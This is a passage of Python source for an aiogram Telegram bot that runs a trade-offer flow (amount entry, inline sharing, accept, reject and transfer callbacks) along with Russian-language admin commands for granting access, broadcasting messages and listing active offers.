@dp.message(OfferFlow.amount)
async def msg_amount(message: Message, state: FSMContext):
    uid = message.from_user.id
    txt = (message.text or "").strip()

    if not txt.isdigit():
        await message.answer(t(uid, "invalid_amount"))
        return

    await state.update_data(amount=int(txt))
    await state.set_state(OfferFlow.offer_language)

    await message.answer(
        e(t(uid, "t_offer_language")),
        reply_markup=language_kb(prefix="offerlang")
    )


@dp.inline_query()
async def inline_share(inline_query: InlineQuery):
    query = (inline_query.query or "").strip()

    if not query.startswith("offer_"):
        await inline_query.answer([], cache_time=1, is_personal=True)
        return

    oid = query[6:]
    o = offers.get(oid)

    if not o or o["status"] != "pending":
        await inline_query.answer([], cache_time=1, is_personal=True)
        return

    lang = o["offer_language"]

    result = InlineQueryResultArticle(
        id=oid,
        title=TEXTS[lang]["inline_title"].format(oid=oid),
        description=TEXTS[lang]["inline_description"],
        input_message_content=InputTextMessageContent(
            message_text=e(offer_text(oid, lang)),
            parse_mode=ParseMode.HTML
        ),
        reply_markup=offer_actions_kb(oid, lang)
    )

    await inline_query.answer(
        [result],
        cache_time=1,
        is_personal=True
    )


@dp.callback_query(F.data.startswith("reject:"))
async def cb_reject(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    o = offers.get(oid)

    if not o or o["status"] != "pending":
        await cb.answer()
        return

    if cb.from_user.id == o["creator_id"]:
        await cb.answer(t(cb.from_user.id, "not_yours"), show_alert=True)
        return

    o["status"] = "rejected"

    try:
        await cb.message.edit_reply_markup(reply_markup=None)
    except Exception:
        pass

    await cb.answer()


@dp.callback_query(F.data.startswith("accept:"))
async def cb_accept(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    o = offers.get(oid)

    if not o or o["status"] != "pending":
        await cb.answer()
        return

    if cb.from_user.id == o["creator_id"]:
        await cb.answer(t(cb.from_user.id, "not_yours"), show_alert=True)
        return

    o["status"] = "accepted"
    o["accepted_by"] = cb.from_user.id
    lang = o["offer_language"]

    await cb.answer(TEXTS[lang]["accept_alert"], show_alert=True)

    trade_id = gen_id()
    text = TEXTS[lang]["trade_text"].format(
        trade_id=trade_id,
        amount=o["amount"],
        currency=o["currency"],
        creator=o["creator_username"],
        link=o["link"]
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text=TEXTS[lang]["btn_transfer"],
            callback_data=f"transfer:{oid}",
            icon_custom_emoji_id=EMOJI_MAP["✅"]
        )
    ]])

    await cb.message.edit_text(e(text), reply_markup=kb)


@dp.callback_query(F.data.startswith("transfer:"))
async def cb_transfer(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    o = offers.get(oid)

    if not o or o["status"] != "accepted":
        await cb.answer()
        return

    if cb.from_user.id != o["accepted_by"]:
        await cb.answer(TEXTS[o["offer_language"]]["not_yours"], show_alert=True)
        return

    o["status"] = "completed"
    lang = o["offer_language"]

    await cb.message.edit_text(e(TEXTS[lang]["transfer_done"]))
    await cb.answer()


@dp.message(Command("dostup"))
async def cmd_dostup(message: Message):
    if message.from_user.id not in ADMINS:
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("Использование: /dostup @username")
        return
    uname = parts[1].strip().lstrip("@").lower()
    verified_handles.add(uname)
    await message.answer(f"Доступ выдан @{uname}")


@dp.message(Command("undostup"))
async def cmd_undostup(message: Message):
    if message.from_user.id not in ADMINS:
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("Использование: /undostup @username")
        return
    uname = parts[1].strip().lstrip("@").lower()
    verified_handles.discard(uname)
    await message.answer(f"Доступ снят с @{uname}")


@dp.message(Command("m"))
async def cmd_m(message: Message):
    if message.from_user.id not in ADMINS:
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("Использование: /m текст")
        return
    sent = 0
    for uid in list(started_users):
        try:
            await bot.send_message(uid, parts[1], parse_mode=None)
            sent += 1
        except Exception:
            pass
    await message.answer(f"Отправлено: {sent}")


@dp.message(Command("offers"))
async def cmd_offers(message: Message):
    if message.from_user.id not in ADMINS:
        return
    active = {
        k: v for k, v in offers.items()
        if v["status"] in {"pending", "accepted"}
    }
    if not active:
        await message.answer("Активных офферов нет")
        return
    lines = ["Активные офферы:"]
    for oid, o in active.items():
        lines.append(
            f"#{oid} | @{o['creator_username']} → "
            f"{o['recipient']} | {o['amount']} {o['currency']}"
        )
    await message.answer("\n".join(lines))


